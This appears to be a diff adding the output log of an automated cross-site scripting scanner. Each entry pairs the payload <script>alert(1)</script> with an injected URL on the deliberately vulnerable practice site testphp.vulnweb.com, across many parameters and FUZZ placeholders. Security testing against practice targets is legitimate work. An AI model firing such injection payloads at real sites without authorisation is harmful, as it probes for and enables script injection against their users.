@@ -1,0 +1,150 @@
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infocateg.php?id=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>&YVeN=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>&YVeN=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/listproducts.php?artist=<script>alert(1)</script>&cat=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/artists.php?+artist=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/listproducts.php?artist=<script>alert(1)</script>&amp%3Basdf=<script>alert(1)</script>&amp%3Bcat=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/listproducts.php?artist=<script>alert(1)</script>&amp%3Basdf=<script>alert(1)</script>&amp%3Bcat=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/listproducts.php?artist=<script>alert(1)</script>&amp%3Basdf=FUZZ&amp%3Bcat=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/listproducts.php?cat=<script>alert(1)</script>&artist=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/listproducts.php?cat=<script>alert(1)</script>&artist=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/showimage.php?file=<script>alert(1)</script>&size=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/showimage.php?file=<script>alert(1)</script>&size=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=<script>alert(1)</script>&mjqN=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=<script>alert(1)</script>&mjqN=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=<script>alert(1)</script>&p=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>&uiDo=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>&uiDo=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>&DUMM=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>&DUMM=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/listproducts.php?artist=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/hpp/params.php?p=<script>alert(1)</script>&pp=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/hpp/params.php?p=<script>alert(1)</script>&pp=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/showimage.php?file=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/hpp/index.php?pp=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/hpp/params.php?p=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/product.php?pic=<script>alert(1)</script>&hkNi=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/product.php?pic=<script>alert(1)</script>&hkNi=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>&HlhS=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>&HlhS=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/hpp/?pp=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/product.php?pic=<script>alert(1)</script>&otIR=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/product.php?pic=<script>alert(1)</script>&otIR=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/product.php?pic=<script>alert(1)</script>&tdRI=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/product.php?pic=<script>alert(1)</script>&tdRI=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=<script>alert(1)</script>&p=<script>alert(1)</script>&pp=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=<script>alert(1)</script>&p=<script>alert(1)</script>&pp=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/listproducts.php?cat=<script>alert(1)</script>&zfdfasdf=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/listproducts.php?cat=<script>alert(1)</script>&zfdfasdf=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>&LDeO=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>&LDeO=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/listproducts.php?artist=<script>alert(1)</script>&asdf=<script>alert(1)</script>&cat=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/artists.php?artist=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/product.php?pic=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/listproducts.php?cat=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>&fYij=<script>alert(1)</script>
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=<script>alert(1)</script>&fYij=FUZZ
+
+Payload: <script>alert(1)</script>
+URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=<script>alert(1)</script>
+
